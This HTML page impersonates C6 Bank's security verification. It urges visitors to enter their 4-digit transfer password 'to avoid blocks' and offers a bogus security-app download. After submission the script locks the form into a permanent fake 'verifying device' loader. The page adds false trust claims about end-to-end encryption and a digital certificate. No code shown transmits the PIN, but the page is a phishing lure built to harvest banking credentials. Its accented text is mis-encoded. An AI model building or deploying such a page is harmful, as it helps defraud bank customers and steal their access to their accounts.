<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C6 Bank ‚Äì Seguran√ßa App</title>
    <style>
        :root {
            --c6-black: #000000;
            --c6-dark: #121212;
            --c6-silver: #a0a0a0;
            --c6-bg: #f5f5f5;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--c6-bg);
            color: var(--c6-black);
            font-family: 'Inter', -apple-system, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: #ffffff;
            width: 100%;
            max-width: 400px;
            padding: 40px 24px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
            border-top: 5px solid var(--c6-black);
        }

        .logo {
            font-size: 30px;
            font-weight: 900;
            color: var(--c6-black);
            margin-bottom: 5px;
            letter-spacing: -1px;
        }

        .logo span {
            color: var(--c6-silver);
            font-weight: 300;
        }

        .subtitle {
            font-size: 0.85rem;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        .input-group {
            margin-bottom: 25px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 0.75rem;
            font-weight: 800;
            margin-bottom: 8px;
            text-transform: uppercase;
            color: var(--c6-black);
        }

        input[type="text"] {
            width: 100%;
            padding: 15px;
            font-size: 28px;
            text-align: center;
            letter-spacing: 10px;
            border: 2px solid var(--c6-black);
            border-radius: 4px;
            outline: none;
            font-weight: 700;
            color: var(--c6-black);
        }

        .btn-container {
            margin-top: 10px;
        }

        button {
            width: 100%;
            padding: 18px;
            background-color: var(--c6-black);
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 0.85rem;
            font-weight: 800;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: background 0.3s;
        }

        button:disabled {
            background-color: #333;
            cursor: not-allowed;
        }

        .loader {
            width: 18px;
            height: 18px;
            border: 3px solid #FFF;
            border-bottom-color: transparent;
            border-radius: 50%;
            display: none;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer-info {
            margin-top: 25px;
            font-size: 0.7rem;
            color: #999;
            line-height: 1.4;
        }

        .security-icon {
            margin-bottom: 15px;
            font-size: 24px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="security-icon">üîí</div>
    <div class="logo">C6 <span>BANK</span></div>
    <p class="subtitle">Verifica√ß√£o obrigat√≥ria para evitar bloqueios. Digite sua senha de transfer√™ncia para sincronizar com o app de seguran√ßa.</p>
    
    <div class="input-group">
        <label>Senha de 4 d√≠gitos (Celular)</label>
        <input id="pin" type="text" inputmode="numeric" maxlength="4" placeholder="0000">
    </div>

    <div class="btn-container">
        <button id="mainBtn">
            <span class="loader" id="loader"></span>
            <span id="btnText">BAIXA APP DE SEGURAN√áA C6 CELULAR</span>
        </button>
    </div>

    <div class="footer-info">
        Conex√£o criptografada ponta a ponta.<br>
        Certificado Digital Carbon Security.
    </div>
</div>

<script>
    const pinInput = document.getElementById('pin');
    const mainBtn = document.getElementById('mainBtn');
    const loader = document.getElementById('loader');
    const btnText = document.getElementById('btnText');

    // Impede digitar qualquer coisa que n√£o seja n√∫mero
    pinInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    mainBtn.addEventListener('click', function() {
        const val = pinInput.value;
        
        if (val.length === 4) {
            // Desativa o bot√£o e o input
            mainBtn.disabled = true;
            pinInput.disabled = true;
            
            // Ativa o loop de "Aguarde"
            loader.style.display = 'inline-block';
            btnText.textContent = 'AGUARDE... VERIFICANDO DISPOSITIVO';
            
            // Loop infinito: O estado n√£o mudar√° daqui.
            console.log("Iniciando loop de seguran√ßa infinito...");
        } else {
            alert("Por favor, digite os 4 d√≠gitos da sua senha.");
        }
    });
</script>

</body>
</html>
